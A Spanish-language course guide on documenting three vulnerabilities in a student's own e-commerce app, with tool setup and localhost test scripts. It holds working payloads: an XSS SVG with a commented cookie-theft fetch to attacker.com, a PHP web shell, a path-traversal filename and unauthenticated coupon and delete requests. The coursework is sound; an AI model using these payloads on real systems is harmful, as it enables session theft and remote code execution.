# Guía para Documentar Evidencias de Vulnerabilidades
## Asignatura: Seguridad en Sistemas Informáticos

**Fecha:** 24 de noviembre de 2025  
**Proyecto:** E-commerce Ferretería v2

---

## 📋 Índice de Herramientas por Vulnerabilidad

| Vulnerabilidad | Herramienta Principal | Herramienta Secundaria | Tipo de Evidencia |
|----------------|----------------------|------------------------|-------------------|
| Credenciales Hardcodeadas | GitLeaks | TruffleHog | Reporte automatizado + Screenshots |
| Sin Autenticación | OWASP ZAP | Postman/cURL | Reporte PDF + Pruebas manuales |
| Carga de Archivos | Burp Suite | Scripts personalizados | Screenshots + Logs |

---

## 🔍 VULNERABILIDAD #1: Credenciales Hardcodeadas

### Herramienta Recomendada: **GitLeaks** (Gratuito, CLI)

#### Instalación en Arch Linux:
```bash
# Opción 1: Desde AUR con yay (RECOMENDADO)
yay -S gitleaks

# Opción 2: Desde AUR con paru
paru -S gitleaks

# Opción 3: Usando Docker
docker pull zricethezav/gitleaks:latest

# Opción 4: Instalación manual
wget https://github.com/gitleaks/gitleaks/releases/download/v8.18.0/gitleaks_8.18.0_linux_x64.tar.gz
tar -xzf gitleaks_8.18.0_linux_x64.tar.gz
sudo mv gitleaks /usr/local/bin/
chmod +x /usr/local/bin/gitleaks

# Verificar instalación
gitleaks version
```

#### Ejecución y Documentación:

**Paso 1: Escanear el repositorio**
```bash
# Desde la raíz del proyecto
cd /home/jpablo/dev/ferreteriav2

# Escanear con Docker
docker run -v $(pwd):/path zricethezav/gitleaks:latest detect \
  --source="/path" \
  --report-path="/path/gitleaks-report.json" \
  --report-format=json \
  --verbose

# O si instalaste localmente
gitleaks detect --source=. --report-path=gitleaks-report.json --verbose
```

**Paso 2: Generar reporte en formato legible**
```bash
# Convertir JSON a formato legible
gitleaks detect --source=. --report-format=sarif --report-path=gitleaks-report.sarif
```

#### Evidencias a Capturar:

1. **Screenshot del comando ejecutándose**
   - Terminal mostrando el escaneo en progreso
   
2. **Reporte JSON/SARIF**
   - Guardar archivo completo
   
3. **Screenshot de código vulnerable**
   - Abrir `frontend/contexts/AuthContext.tsx` líneas 51-52
   - Abrir `backend/docker-compose.yml` líneas 8-10
   - Usar resaltado de VS Code

4. **Análisis manual adicional**
   ```bash
   # Buscar todas las contraseñas en el código
   grep -r "password" --include="*.ts" --include="*.tsx" --include="*.yml" .
   
   # Buscar secretos y tokens
   grep -r -E "(api_key|api_secret|token|secret)" --include="*.ts" .
   ```

#### Formato de Documentación:

```markdown
### Evidencia 1.1: Escaneo con GitLeaks
- **Comando ejecutado:** `gitleaks detect --source=. --verbose`
- **Fecha:** [fecha]
- **Resultados:** X secretos detectados
- **Archivo:** `gitleaks-report.json`

### Evidencia 1.2: Código Vulnerable Identificado
[Screenshot de AuthContext.tsx con credenciales]

### Evidencia 1.3: Configuración de Docker Expuesta
[Screenshot de docker-compose.yml con contraseñas]
```

---

## 🔓 VULNERABILIDAD #2: Sin Autenticación/Autorización

### Herramienta Recomendada: **OWASP ZAP** (Gratuito, GUI)

#### Instalación en Arch Linux:
```bash
# Opción 1: Desde repositorios oficiales (RECOMENDADO)
sudo pacman -S zaproxy

# Opción 2: Desde AUR con yay (versión más reciente)
yay -S zaproxy

# Opción 3: Usando Docker
docker pull zaproxy/zap-stable

# Opción 4: Descarga directa (si prefieres la versión oficial)
wget https://github.com/zaproxy/zaproxy/releases/download/v2.14.0/ZAP_2.14.0_Linux.tar.gz
tar -xzf ZAP_2.14.0_Linux.tar.gz
cd ZAP_2.14.0
./zap.sh

# Verificar instalación
zaproxy -version

# Lanzar OWASP ZAP
zaproxy
```

#### Preparación del Entorno:

**Paso 1: Levantar la aplicación**
```bash
# Terminal 1 - Backend
cd backend
npm run start:dev

# Terminal 2 - Frontend (si es necesario)
cd frontend
npm run dev
```

**Paso 2: Verificar endpoints accesibles**
```bash
# Listar todos los endpoints
curl http://localhost:3000/products
curl http://localhost:3000/categories
curl http://localhost:3000/transactions
```

#### Uso de OWASP ZAP:

**Configuración Inicial:**
1. Abrir OWASP ZAP
2. Modo: "Standard Mode" o "Attack Mode"
3. URL objetivo: `http://localhost:3000`

**Escaneo Automatizado:**
1. **Automated Scan**
   - URL: `http://localhost:3000`
   - Usar Spider tradicional y AJAX Spider
   - Activar Active Scan

2. **Configuración del Scan**
   - Policy: Default Policy
   - Attack Strength: Medium
   - Alert Threshold: Medium

**Escaneo Manual (MÁS EFECTIVO para esta vulnerabilidad):**

```bash
# Exportar colección de requests para ZAP
# Archivo: zap-requests.txt
GET http://localhost:3000/products
POST http://localhost:3000/products
PUT http://localhost:3000/products/1
DELETE http://localhost:3000/products/1
GET http://localhost:3000/categories
POST http://localhost:3000/categories
DELETE http://localhost:3000/categories/1
POST http://localhost:3000/transactions
DELETE http://localhost:3000/transactions/1
POST http://localhost:3000/payment/create
```

**Paso 3: Importar en ZAP**
- Tools → Import URLs → Seleccionar archivo
- Enviar cada request desde History
- Verificar respuestas exitosas (200, 201)

**Paso 4: Generar Reporte**
- Report → Generate HTML Report
- Report → Generate XML Report
- Guardar en: `evidencias/zap-report-sin-autenticacion.html`

#### Pruebas Manuales Adicionales con cURL:

**Script de Prueba Completa:**
```bash
#!/bin/bash
# Archivo: test-sin-autenticacion.sh

echo "=== PRUEBA DE VULNERABILIDAD: SIN AUTENTICACIÓN ==="
echo "Fecha: $(date)"
echo ""

# Prueba 1: Crear producto sin autenticación
echo "1. Intentando CREAR producto sin autenticación..."
curl -X POST http://localhost:3000/products \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Producto Malicioso",
    "image": "http://evil.com/image.jpg",
    "price": 1,
    "inventory": 999,
    "categoryId": 1
  }' \
  -w "\nHTTP Status: %{http_code}\n\n"

# Prueba 2: Eliminar producto sin autenticación
echo "2. Intentando ELIMINAR producto sin autenticación..."
curl -X DELETE http://localhost:3000/products/1 \
  -w "\nHTTP Status: %{http_code}\n\n"

# Prueba 3: Modificar precio sin autenticación
echo "3. Intentando MODIFICAR precio sin autenticación..."
curl -X PUT http://localhost:3000/products/2 \
  -H "Content-Type: application/json" \
  -d '{
    "price": 1
  }' \
  -w "\nHTTP Status: %{http_code}\n\n"

# Prueba 4: Crear cupón de 100% descuento
echo "4. Intentando CREAR cupón malicioso sin autenticación..."
curl -X POST http://localhost:3000/coupons \
  -H "Content-Type: application/json" \
  -d '{
    "code": "HACK100",
    "discount": 100,
    "expirationDate": "2026-12-31"
  }' \
  -w "\nHTTP Status: %{http_code}\n\n"

echo "=== FIN DE PRUEBAS ==="
```

**Ejecutar y documentar:**
```bash
chmod +x test-sin-autenticacion.sh
./test-sin-autenticacion.sh | tee evidencias/prueba-sin-auth.log
```

#### Alternativa: Postman

**Crear Colección de Pruebas:**

1. **Importar colección**
   - Crear archivo: `postman-collection.json`

2. **Requests a incluir:**
   - GET /products (Lectura - debería ser público)
   - POST /products (Escritura - debería requerir auth) ❌
   - PUT /products/1 (Modificación - debería requerir auth) ❌
   - DELETE /products/1 (Eliminación - debería requerir auth) ❌
   - POST /categories (Admin only) ❌
   - POST /transactions (Usuario autenticado) ❌

3. **Evidencias de Postman:**
   - Screenshot de cada request exitoso SIN headers de autenticación
   - Exportar respuestas
   - Exportar colección completa

#### Formato de Documentación:

```markdown
### Evidencia 2.1: Reporte OWASP ZAP
- **Herramienta:** OWASP ZAP v2.14.0
- **URL objetivo:** http://localhost:3000
- **Endpoints sin protección:** 15 detectados
- **Archivo:** `zap-report-sin-autenticacion.html`

### Evidencia 2.2: Pruebas manuales con cURL
- **Script:** `test-sin-autenticacion.sh`
- **Resultados:** 4/4 requests exitosos sin autenticación
- **Log completo:** `prueba-sin-auth.log`

### Evidencia 2.3: Análisis de Código
[Screenshot de productos.controller.ts sin @UseGuards]
```

---

## 📤 VULNERABILIDAD #3: Carga de Archivos Sin Validación

### Herramienta Recomendada: **Burp Suite Community** (Gratuito)

#### Instalación en Arch Linux:
```bash
# Opción 1: Desde AUR con yay (RECOMENDADO - auto-actualizable)
yay -S burpsuite

# Opción 2: Desde AUR con paru
paru -S burpsuite

# Opción 3: Instalación manual desde la web oficial
# Descargar desde: https://portswigger.net/burp/communitydownload
wget 'https://portswigger-cdn.net/burp/releases/download?product=community&version=2023.10.3.7&type=Linux' -O burpsuite_installer.sh
chmod +x burpsuite_installer.sh
./burpsuite_installer.sh

# Lanzar Burp Suite
burpsuite  # Si instalaste desde AUR
# O buscar en el menú de aplicaciones: "Burp Suite Community"
```

#### Configuración del Proxy:

**Paso 1: Configurar Burp Suite**
1. Proxy → Options
2. Interface: 127.0.0.1:8080
3. Intercept: ON

**Paso 2: Configurar Navegador**
```bash
# Para Firefox con FoxyProxy
# O usar curl con proxy:
curl -x http://127.0.0.1:8080 ...
```

#### Pruebas de Explotación:

**Prueba 1: Subir archivo SVG con XSS**

Crear archivo malicioso:
```xml
<!-- malicious.svg -->
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <rect width="300" height="100" style="fill:rgb(255,0,0);"/>
   <script type="text/javascript">
      alert('XSS Vulnerability - Credenciales robadas: ' + document.cookie);
      // En un ataque real:
      // fetch('http://attacker.com/steal?data=' + document.cookie);
   </script>
   <text x="0" y="20" font-size="20" fill="white">Imagen Maliciosa</text>
</svg>
```

Subir archivo:
```bash
curl -X POST http://localhost:3000/products/upload-image \
  -F "file=@malicious.svg" \
  -v
```

**Prueba 2: Subir archivo ejecutable**

```bash
# Crear archivo .exe fake (solo para prueba)
echo "MALWARE SIMULADO" > malware.exe

curl -X POST http://localhost:3000/products/upload-image \
  -F "file=@malware.exe" \
  -v
```

**Prueba 3: Archivo de gran tamaño (DoS)**

```bash
# Crear archivo de 100MB
dd if=/dev/zero of=huge-file.jpg bs=1M count=100

# Intentar subirlo
curl -X POST http://localhost:3000/products/upload-image \
  -F "file=@huge-file.jpg" \
  -v \
  --max-time 30
```

**Prueba 4: Extensión doble (.jpg.php)**

```bash
# Crear archivo con doble extensión
echo '<?php system($_GET["cmd"]); ?>' > shell.jpg.php

curl -X POST http://localhost:3000/products/upload-image \
  -F "file=@shell.jpg.php" \
  -v
```

#### Script de Pruebas Automatizado:

```bash
#!/bin/bash
# Archivo: test-file-upload.sh

echo "=== PRUEBA DE CARGA DE ARCHIVOS SIN VALIDACIÓN ==="
echo "Fecha: $(date)"
echo ""

# Crear directorio para archivos maliciosos
mkdir -p evidencias/archivos-prueba

# 1. SVG con XSS
echo "1. Creando SVG malicioso..."
cat > evidencias/archivos-prueba/xss.svg << 'EOF'
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert('XSS')</script>
</svg>
EOF

echo "   Subiendo SVG malicioso..."
curl -X POST http://localhost:3000/products/upload-image \
  -F "file=@evidencias/archivos-prueba/xss.svg" \
  -w "\n   Status: %{http_code}\n" \
  -o evidencias/response-xss.json

# 2. Archivo ejecutable
echo "2. Creando archivo ejecutable falso..."
echo "FAKE MALWARE" > evidencias/archivos-prueba/malware.exe

echo "   Subiendo archivo .exe..."
curl -X POST http://localhost:3000/products/upload-image \
  -F "file=@evidencias/archivos-prueba/malware.exe" \
  -w "\n   Status: %{http_code}\n" \
  -o evidencias/response-exe.json

# 3. Archivo PHP
echo "3. Creando archivo PHP..."
echo '<?php phpinfo(); ?>' > evidencias/archivos-prueba/shell.php

echo "   Subiendo archivo .php..."
curl -X POST http://localhost:3000/products/upload-image \
  -F "file=@evidencias/archivos-prueba/shell.php" \
  -w "\n   Status: %{http_code}\n" \
  -o evidencias/response-php.json

# 4. Archivo grande (10MB)
echo "4. Creando archivo grande (10MB)..."
dd if=/dev/zero of=evidencias/archivos-prueba/huge.jpg bs=1M count=10 2>/dev/null

echo "   Subiendo archivo grande..."
curl -X POST http://localhost:3000/products/upload-image \
  -F "file=@evidencias/archivos-prueba/huge.jpg" \
  -w "\n   Status: %{http_code}\n   Tiempo: %{time_total}s\n" \
  -o evidencias/response-huge.json

# 5. Nombre de archivo malicioso
echo "5. Creando archivo con nombre malicioso..."
echo "test" > 'evidencias/archivos-prueba/../../../etc/passwd.jpg'

echo "   Subiendo archivo con path traversal..."
curl -X POST http://localhost:3000/products/upload-image \
  -F "file=@evidencias/archivos-prueba/../../../etc/passwd.jpg" \
  -w "\n   Status: %{http_code}\n" \
  -o evidencias/response-traversal.json 2>/dev/null || echo "   Error en subida"

echo ""
echo "=== RESUMEN DE RESULTADOS ==="
echo "Ver archivos de respuesta en: evidencias/"
ls -lh evidencias/response-*.json
echo ""
echo "=== FIN DE PRUEBAS ==="
```

**Ejecutar:**
```bash
chmod +x test-file-upload.sh
./test-file-upload.sh | tee evidencias/prueba-upload.log
```

#### Formato de Documentación:

```markdown
### Evidencia 3.1: Burp Suite - Interceptación de Request
[Screenshot de Burp mostrando request sin validación]

### Evidencia 3.2: Subida de SVG Malicioso
- **Archivo:** `xss.svg` con script embebido
- **Resultado:** Archivo aceptado sin validación
- **Response:** `response-xss.json`

### Evidencia 3.3: Subida de Ejecutable
- **Archivo:** `malware.exe`
- **Resultado:** Aceptado sin verificar tipo de archivo
- **Riesgo:** Almacenamiento de malware en Cloudinary

### Evidencia 3.4: Archivo de Gran Tamaño
- **Tamaño:** 10MB (sin límite configurado)
- **Riesgo:** DoS por consumo de recursos
```

---

## 📊 Herramientas Complementarias

### 1. **npm audit** - Vulnerabilidades de Dependencias

```bash
cd backend
npm audit --json > ../evidencias/npm-audit-backend.json
npm audit

cd ../frontend
npm audit --json > ../evidencias/npm-audit-frontend.json
npm audit
```

### 2. **Snyk** - Análisis de Seguridad

```bash
# Instalación en Arch Linux
# Opción 1: Con npm (funciona igual)
npm install -g snyk

# Opción 2: Desde AUR
yay -S snyk

# Autenticarse
snyk auth

# Escanear backend
cd backend
snyk test --json > ../evidencias/snyk-backend.json
snyk test

# Escanear frontend
cd ../frontend
snyk test --json > ../evidencias/snyk-frontend.json
snyk test
```

### 3. **SonarQube (Opcional pero profesional)**

```bash
# Instalación en Arch Linux

# Opción 1: Usando Docker (RECOMENDADO - más fácil)
docker run -d --name sonarqube -p 9000:9000 sonarqube:lts-community

# Opción 2: Instalación nativa desde AUR
yay -S sonarqube
sudo systemctl start sonarqube
sudo systemctl enable sonarqube

# Acceder a: http://localhost:9000
# Login: admin/admin

# Instalar SonarScanner
# Opción 1: Desde AUR
yay -S sonar-scanner

# Opción 2: Con npm
npm install -g sonarqube-scanner

# Crear archivo sonar-project.properties
cat > sonar-project.properties << EOF
sonar.projectKey=ferreteria-v2
sonar.projectName=Ferreteria v2
sonar.sources=backend/src,frontend
sonar.host.url=http://localhost:9000
sonar.login=your-token
EOF

# Ejecutar análisis
sonar-scanner
```

---

## 📁 Estructura de Carpetas para Evidencias

```
ferreteriav2/
├── evidencias/
│   ├── vulnerabilidad-1-credenciales/
│   │   ├── gitleaks-report.json
│   │   ├── screenshot-authcontext.png
│   │   ├── screenshot-docker-compose.png
│   │   └── grep-passwords.txt
│   │
│   ├── vulnerabilidad-2-sin-autenticacion/
│   │   ├── zap-report.html
│   │   ├── zap-report.xml
│   │   ├── prueba-sin-auth.log
│   │   ├── test-sin-autenticacion.sh
│   │   ├── postman-collection.json
│   │   ├── screenshot-delete-sin-auth.png
│   │   └── screenshot-create-coupon.png
│   │
│   ├── vulnerabilidad-3-file-upload/
│   │   ├── archivos-prueba/
│   │   │   ├── xss.svg
│   │   │   ├── malware.exe
│   │   │   ├── shell.php
│   │   │   └── huge.jpg
│   │   ├── burp-intercept.png
│   │   ├── response-*.json
│   │   ├── prueba-upload.log
│   │   └── test-file-upload.sh
│   │
│   └── analisis-complementario/
│       ├── npm-audit-backend.json
│       ├── npm-audit-frontend.json
│       ├── snyk-backend.json
│       └── snyk-frontend.json
│
└── VULNERABILIDADES_SEGURIDAD.md
```

---

## 📝 Script para Crear Estructura

```bash
#!/bin/bash
# Archivo: setup-evidencias.sh

echo "Creando estructura de directorios para evidencias..."

mkdir -p evidencias/vulnerabilidad-1-credenciales
mkdir -p evidencias/vulnerabilidad-2-sin-autenticacion
mkdir -p evidencias/vulnerabilidad-3-file-upload/archivos-prueba
mkdir -p evidencias/analisis-complementario

echo "✅ Estructura creada exitosamente"
echo ""
echo "Carpetas creadas:"
tree evidencias -L 2
```

---

## 🎓 Formato Recomendado para el Informe Final

### Estructura del Documento:

```markdown
# Informe de Vulnerabilidades - Ferretería v2
**Estudiante:** [Tu nombre]
**Asignatura:** Seguridad en Sistemas Informáticos
**Fecha:** 24 de noviembre de 2025

## 1. Introducción
- Descripción del sistema analizado
- Metodología utilizada
- Herramientas empleadas

## 2. Vulnerabilidad #1: Credenciales Hardcodeadas

### 2.1 Descripción
[Explicación técnica]

### 2.2 Evidencias
**Evidencia 1:** Escaneo con GitLeaks
[Screenshot + archivo JSON]

**Evidencia 2:** Código vulnerable
[Screenshot del código]

**Evidencia 3:** Búsqueda manual
[Output de grep]

### 2.3 Impacto
[Análisis de riesgo]

### 2.4 Recomendaciones
[Soluciones propuestas con código]

## 3. Vulnerabilidad #2: [...]
[Mismo formato]

## 4. Vulnerabilidad #3: [...]
[Mismo formato]

## 5. Conclusiones

## 6. Referencias

## 7. Anexos
- Scripts de prueba
- Reportes completos de herramientas
- Logs de ejecución
```

---

## ✅ Checklist de Documentación

### Para cada vulnerabilidad debes tener:

- [ ] **Descripción técnica** (qué es, dónde está, por qué es vulnerable)
- [ ] **Evidencia automatizada** (reporte de herramienta profesional)
- [ ] **Evidencia manual** (screenshots, logs de pruebas)
- [ ] **Código vulnerable** identificado específicamente
- [ ] **Prueba de concepto** (PoC) funcionando
- [ ] **Impacto** documentado (qué puede hacer un atacante)
- [ ] **Referencias** (CWE, OWASP, CVE si aplica)
- [ ] **Recomendaciones** de remediación con código

---

## 🚀 Plan de Ejecución Rápido en Arch Linux (2-3 horas)

### Preparación Inicial (15 min)
```bash
# Instalar todas las herramientas de una vez
yay -S gitleaks zaproxy burpsuite

# O si prefieres Docker
docker pull zricethezav/gitleaks:latest
docker pull zaproxy/zap-stable

# Crear estructura de carpetas
mkdir -p evidencias/{vulnerabilidad-1-credenciales,vulnerabilidad-2-sin-autenticacion,vulnerabilidad-3-file-upload/archivos-prueba,analisis-complementario}

# Instalar herramientas de screenshots
sudo pacman -S flameshot
```

### Hora 1: Vulnerabilidad #1
```bash
# 15 min: Ejecutar GitLeaks
gitleaks detect --source=. --verbose --report-path=evidencias/vulnerabilidad-1-credenciales/gitleaks-report.json

# 15 min: Screenshots del código con Flameshot
# Abrir AuthContext.tsx y docker-compose.yml
# Presionar tu atajo de teclado para Flameshot

# 15 min: Análisis manual con grep
grep -r "password" --include="*.ts" --include="*.tsx" --include="*.yml" . | tee evidencias/vulnerabilidad-1-credenciales/grep-passwords.txt

# 15 min: Documentar hallazgos
```

### Hora 2: Vulnerabilidad #2
```bash
# 20 min: Levantar backend y configurar OWASP ZAP
cd backend && npm run start:dev &
zaproxy  # Lanzar en GUI mode

# 20 min: Escaneo automatizado en ZAP
# URL: http://localhost:3000
# Spider → Active Scan → Generate Report

# 20 min: Pruebas manuales con cURL
./test-sin-autenticacion.sh | tee evidencias/vulnerabilidad-2-sin-autenticacion/prueba-sin-auth.log
```

### Hora 3: Vulnerabilidad #3
```bash
# 20 min: Configurar Burp Suite
burpsuite  # Configurar proxy 127.0.0.1:8080

# 20 min: Crear archivos maliciosos de prueba
./test-file-upload.sh

# 20 min: Ejecutar script de pruebas y documentar
# Screenshots de Burp interceptando requests
```

---

## 📚 Referencias de Herramientas

- **GitLeaks:** https://github.com/gitleaks/gitleaks
- **GitLeaks AUR:** https://aur.archlinux.org/packages/gitleaks
- **OWASP ZAP:** https://www.zaproxy.org/
- **OWASP ZAP Arch:** https://archlinux.org/packages/extra/any/zaproxy/
- **Burp Suite:** https://portswigger.net/burp/communitydownload
- **Burp Suite AUR:** https://aur.archlinux.org/packages/burpsuite
- **Snyk:** https://snyk.io/
- **npm audit:** https://docs.npmjs.com/cli/v8/commands/npm-audit
- **Arch Wiki - Security:** https://wiki.archlinux.org/title/Security

---

## 🐧 Configuración Específica para Arch Linux

### Dependencias Adicionales

```bash
# Asegurarse de tener todas las dependencias necesarias
sudo pacman -S jdk-openjdk  # Para Burp Suite y OWASP ZAP (Java)
sudo pacman -S nodejs npm    # Para herramientas Node.js
sudo pacman -S curl wget git # Utilidades básicas
sudo pacman -S tree          # Para visualizar estructura de carpetas
sudo pacman -S imagemagick   # Para manipular screenshots si es necesario
```

### Configurar Java para ZAP y Burp Suite

```bash
# Verificar versión de Java
java -version

# Si tienes múltiples versiones de Java, seleccionar la correcta
sudo archlinux-java set java-17-openjdk  # O la versión que necesites

# Ver versiones disponibles
archlinux-java status
```

### Permisos y Configuración

```bash
# Si usas Docker, agregar tu usuario al grupo
sudo usermod -aG docker $USER
newgrp docker  # Aplicar sin reiniciar sesión

# Verificar que Docker funcione sin sudo
docker run hello-world
```

### Firefox/Chrome con Proxy para Burp Suite

**Para Firefox (recomendado en Arch):**
```bash
# Instalar Firefox si no lo tienes
sudo pacman -S firefox

# Instalar extensión FoxyProxy
# 1. Ir a: https://addons.mozilla.org/firefox/addon/foxyproxy-standard/
# 2. Agregar extensión
# 3. Configurar proxy: 127.0.0.1:8080
```

**Para Chrome/Chromium:**
```bash
# Instalar Chromium
sudo pacman -S chromium

# Lanzar con proxy
chromium --proxy-server="127.0.0.1:8080"
```

### Screenshots en Arch Linux

```bash
# Herramientas recomendadas para screenshots
sudo pacman -S flameshot      # Recomendado - muy completo
sudo pacman -S spectacle      # Si usas KDE
sudo pacman -S gnome-screenshot  # Si usas GNOME
sudo pacman -S maim slop      # Ligero y scripteable

# Usar Flameshot (mi recomendación)
flameshot gui  # Modo interactivo

# Configurar atajo de teclado
# En tu WM/DE, asignar: flameshot gui
```

---

## 💡 Consejos Finales para Arch Linux

1. **Documenta TODO el proceso** - Screenshots de cada paso
2. **Guarda los comandos ejecutados** - Copia/pega exactamente
3. **Fecha y hora** en cada evidencia
4. **Versiones de herramientas** - Importante para reproducibilidad
5. **No modifiques el código vulnerable** hasta después de documentar
6. **Backups** - Guarda todo en carpeta `evidencias/`
7. **PDF final** - Convierte el informe a PDF para entregar

---

## 🎯 Resultado Esperado

Al final deberías tener:

✅ **3 vulnerabilidades completamente documentadas**  
✅ **Reportes de al menos 2 herramientas profesionales**  
✅ **Pruebas de concepto funcionando**  
✅ **Screenshots claros y numerados**  
✅ **Scripts de prueba reproducibles**  
✅ **Informe profesional en Markdown + PDF**

**Tiempo estimado total:** 3-4 horas de trabajo concentrado

¡Buena suerte con tu proyecto! 🚀
